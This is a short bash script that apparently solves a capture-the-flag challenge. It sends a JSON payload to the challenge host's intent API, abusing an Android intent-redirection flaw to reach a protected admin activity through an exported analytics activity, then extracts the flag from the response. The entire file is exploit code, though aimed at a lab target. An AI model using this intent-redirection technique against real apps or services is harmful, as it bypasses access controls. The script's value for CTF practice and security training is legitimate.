#!/usr/bin/env bash
set -euo pipefail

if [ "${1:-}" = "-h" ] || [ "${1:-}" = "--help" ]; then
  printf 'Usage: %s [base_url]\n' "$0"
  exit 0
fi

base_url="${1:-https://8ae749bc46eca4ae.chal.ctf.ae}"

payload='{"component":"com.fluidctf.messenger.sdk.AnalyticsRedirectActivity","extras":{"next_intent":{"component":"com.fluidctf.messenger.AdminPanelActivity","extras":{}}}}'

response="$(
  curl -k -sS \
    -H "Content-Type: application/json" \
    -d "$payload" \
    "${base_url%/}/api/intent/send"
)"

flag="$(printf '%s' "$response" | grep -o 'flag{[^}]*}' | head -n 1 || true)"
if [ -n "$flag" ]; then
  printf '%s\n' "$flag"
else
  printf '%s\n' "$response"
fi
